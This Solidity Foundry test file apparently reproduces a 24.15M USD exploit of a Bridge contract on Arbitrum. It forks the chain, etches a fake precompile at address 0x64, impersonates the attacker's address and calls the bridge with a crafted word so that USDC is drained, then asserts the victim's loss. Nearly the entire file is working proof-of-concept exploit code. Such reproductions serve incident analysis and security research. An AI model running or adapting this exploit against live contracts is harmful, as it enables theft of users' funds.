// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import "./Base.sol";

// @KeyInfo - Total Lost : 24.15M USD
// Attacker : 0x5553ea7bda594ade7afe91d279779a42b2b84208
// Attack Contract : 0xcb3b9a3e5668afe84dc7a864b36b845dce062e67
// Vulnerable Contract : 0xcb3b9a3e5668afe84dc7a864b36b845dce062e67
// Attack Tx : 0x50d0b3ec6c3f5fce0f10abf81540bbb508f421494aa2b3480c4a264b0436547b
// Block : 486658838
// Chain : Arbitrum
// Analysis :
//
// @Reproduction
// Verdict : pass
// Economic Proof : impact_loss_reproduction
// Reproduced Value : 24.15M USD
//
// @POC Author
// Generated PoC

contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.Bridge;
    uint256 constant FORK_BLOCK = 486658837;
    uint256 constant TX_TIMESTAMP = 1784755825;
    uint256 constant TX_BLOCK_NUMBER = 486658838;
    uint256 constant TX_VALUE = 0;

    uint64 constant ATTACKER_EOA_TX_NONCE = 4728;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        vm.etch(address(0x64), hex"7f000000000000000000000000000000000000000000000000000000001d01d31660005260206000f3");
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        _prepareProfit(ATTACK_CONTRACT, address(0));
        attack();
        vm.stopPrank();
        _assertProfit();
        _assertEcon();
    }

    function attack() internal {
        bytes32[] memory observedWords = new bytes32[](1);
        observedWords[0] = bytes32(hex"558a989f405d706935fa15efee8eac6e32fbba7ea3f70dfd930c66436e7ed8c2");
        (bool ok, bytes memory result) =
            Addresses.Bridge.call{value: 0}(abi.encodeWithSelector(bytes4(0xc5bdf3ca), observedWords));
        if (!ok) assembly { revert(add(result, 32), mload(result)) }
    }

    function _expectProfitLegs(address _attackTarget, address _childTarget) internal override {
        economicOracles.push(
            EconomicOracle(Addresses.Bridge, Addresses.USDC, "USDC", "victim_loss", false, 24150000000000, false)
        );
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant attacker_eoa = 0x5553EA7Bda594aDE7AFe91D279779a42b2B84208; // Addresses.attacker_eoa = 0x5553ea7bda594ade7afe91d279779a42b2b84208 label=attacker_eoa roles=attacker_eoa|contract|sender source=tx_metadata.from confidence=high
    address internal constant USDC = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831; // Addresses.USDC = 0xaf88d065e77c8cc2239327c5edb3a432268e5831 label=FiatTokenProxy token_symbol=USDC roles=asset|contract|economic_asset|observed_address|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant Bridge = 0xCb3B9A3E5668AFE84DC7A864B36b845dCE062e67; // Addresses.Bridge = 0xcb3b9a3e5668afe84dc7a864b36b845dce062e67 label=Bridge roles=asset|contract|economic_holder|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
}
